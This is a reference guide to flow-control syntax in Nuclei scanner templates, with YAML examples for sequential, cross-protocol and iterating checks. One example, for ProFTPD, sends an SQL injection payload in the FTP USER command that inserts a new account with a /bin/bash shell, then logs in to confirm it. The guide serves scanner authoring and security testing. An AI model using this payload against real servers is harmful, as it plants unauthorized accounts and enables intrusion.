# Flow Control Reference

Complete reference for Nuclei template flow control syntax.

## Table of Contents
- [Overview](#overview)
- [Basic Syntax](#basic-syntax)
- [Flow Operators](#flow-operators)
- [Iteration with iterate()](#iteration-with-iterate)
- [Variable Setting with set()](#variable-setting-with-set)
- [Examples](#examples)

---

## Overview

The `flow` field controls template execution order. It enables:
- Sequential execution of multiple request/code blocks
- Conditional execution based on previous results
- Iteration over extracted arrays
- Cross-protocol execution (tcp → javascript, http → http, etc.)

---

## Basic Syntax

```yaml
flow: http(1) && http(2)    # Execute HTTP request 1, then 2 (both must succeed)
flow: tcp(1) && javascript(1)  # Execute TCP first, then JavaScript
flow: code(1)              # Execute code block 1 only
```

---

## Flow Operators

| Operator | Description | Example |
|---|---|---|
| `&&` | Logical AND (both must succeed) | `http(1) && http(2)` |
| `\|\|` | Logical OR (either can succeed) | `http(1) \|\| http(2)` |
| `code(N)` | Execute code block N | `code(1)` |
| `http(N)` | Execute HTTP request N | `http(1)` |
| `tcp(N)` | Execute TCP request N | `tcp(1)` |
| `javascript(N)` | Execute JavaScript block N | `javascript(1)` |

---

## Iteration with iterate()

Loop over extracted arrays from previous blocks:

```yaml
flow: |
  code(1)
  for(let item of iterate(template.items)){
    set("item_name", item)
    code(2)
  }
```

### Syntax Details
- `template.varname` - Access extracted variable from previous block
- `iterate(array)` - Normalize and iterate over array
- `for...of` - JavaScript-style loop

---

## Variable Setting with set()

Set variables for use in subsequent blocks:

```yaml
flow: |
  code(1)
  for(let instance of iterate(template.instances)){
    set("ec2instance", instance)
    code(2)
  }
```

---

## Examples

### Sequential HTTP Requests

```yaml
flow: http(1) && http(2)

http:
  # Request 1: Check if app exists
  - method: GET
    path:
      - "{{BaseURL}}/login"
    matchers:
      - type: dsl
        dsl:
          - 'contains(body, "MyApp")'
          - "status_code == 200"
        condition: and
        internal: true

  # Request 2: Check for vulnerability
  - method: GET
    path:
      - "{{BaseURL}}/admin/config"
    matchers:
      - type: word
        words:
          - "secret_key"
        part: body
```

### Cross-Protocol (TCP → JavaScript)

```yaml
flow: tcp(1) && javascript(1)

tcp:
  - host:
      - "{{Host}}:1666"
    inputs:
      - type: hex
        data: "efef0000..."
    read-size: 4096
    matchers:
      - type: word
        part: data
        words:
          - "server"
        internal: true

javascript:
  - code: |
      var net = require("nuclei/net");
      // ... complex protocol logic ...
      JSON.stringify(results);
    args:
      Host: "{{Host}}"
      Port: "1666"
    matchers:
      - type: word
        words:
          - '"depotFile":'
```

### Cloud Resource Iteration

```yaml
variables:
  region: "us-east-1"

flow: |
  code(1)
  for(let instance of iterate(template.instances)){
    set("ec2instance", instance)
    code(2)
  }

self-contained: true
code:
  # Block 1: List all instances
  - engine:
      - sh
      - bash
    source: |
      aws ec2 describe-instances --region $region --output json \
        --query 'Reservations[*].Instances[*].InstanceId'
    extractors:
      - type: json
        name: instances
        internal: true
        json:
          - '.[]'

  # Block 2: Check each instance
  - engine:
      - sh
      - bash
    source: |
      aws ec2 describe-instances --region $region \
        --instance-ids $ec2instance \
        --query 'Reservations[*].Instances[*].MetadataOptions.HttpTokens[]'
    matchers:
      - type: word
        words:
          - "optional"
```

### TCP Sequential Requests with randstr

```yaml
flow: tcp(1) && tcp(2)

tcp:
  # Request 1: Send exploit payload
  - inputs:
      - data: "USER ', null, null); INSERT INTO users VALUES($${{randstr}}$$, $${{randstr}}$$, 0, 0, $$/$$, $$/bin/bash$$); --'\r\n"
        read: 1024
      - data: "PASS test\r\n"
    host:
      - "{{Hostname}}"
    port: 21
    read-size: 1024
    matchers:
      - type: word
        part: raw
        words:
          - "220 ProFTPD"
        internal: true

  # Request 2: Verify exploit worked
  - inputs:
      - data: "USER {{randstr}}\r\n"
        read: 1024
      - data: "PASS {{randstr}}\r\n"
        read: 1024
    host:
      - "{{Hostname}}"
    port: 21
    read-size: 2048
    matchers:
      - type: word
        part: raw
        words:
          - "230"
```

---

## Summary

| Feature | Syntax | Description |
|---|---|---|
| Sequential | `http(1) && http(2)` | Execute blocks in order |
| Cross-protocol | `tcp(1) && javascript(1)` | Mix protocol types |
| Iteration | `for(let x of iterate(template.var))` | Loop over extracted array |
| Variable setting | `set("name", value)` | Set variable for next block |
| Code execution | `code(1)` | Execute code block |
| Internal matcher | `internal: true` | Hide matcher output, use as pre-condition |
